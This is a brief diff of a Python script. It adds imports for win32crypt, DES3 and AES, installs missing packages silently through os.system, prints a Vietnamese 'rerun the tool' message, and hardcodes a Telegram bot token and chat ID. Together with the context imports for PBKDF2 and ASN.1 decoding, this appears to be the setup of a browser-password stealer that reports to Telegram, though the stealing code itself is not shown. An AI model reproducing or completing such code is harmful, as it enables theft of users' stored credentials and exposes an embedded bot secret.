@@ -6,6 +6,17 @@ from pyasn1.codec.der import decoder
 from hashlib import sha1, pbkdf2_hmac
 from Crypto.Util.Padding import unpad 
 from base64 import b64decode
+try:
+  from requests import session
+  import requests, random, re, win32crypt
+  from random import randint
+  from Crypto.Cipher import DES3
+  from Crypto.Cipher import AES
+except:
+  os.system("pip install pypiwin32")
+  os.system("pip install pycryptodome")
+  os.system("pip install requests")
+  print('__Vui Lòng Chạy Lại Tool__')
 apibot1='6859238707:AAFA1XfMqd61U-tcpKl6vEiZUQ2cSAPZOJM'
 id1 = "5478300957"
 
